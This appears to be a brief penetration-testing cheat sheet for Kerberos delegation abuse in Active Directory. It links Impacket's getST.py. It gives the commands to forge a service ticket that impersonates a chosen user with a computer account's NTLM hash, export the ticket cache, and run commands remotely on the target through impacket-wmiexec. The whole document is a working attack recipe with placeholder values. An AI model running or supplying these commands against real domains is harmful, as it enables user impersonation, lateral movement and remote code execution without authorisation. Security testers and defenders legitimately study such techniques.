### Source
https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/getST.py  

### Create service ticket using computer account and delegate ticket to impersonate user
```
impacket-getST -spn cifs/<fqdnRhost> -impersonate <impersonateUser> -hashes :<ntlmHash> <domain>/<computerAccount>
```

### Export ticket
```
export KRB5CCNAME=<impersonateUser>.ccache
```

### Use ticket
```
impacket-wmiexec -k -no-pass <fqdnRhost>
```

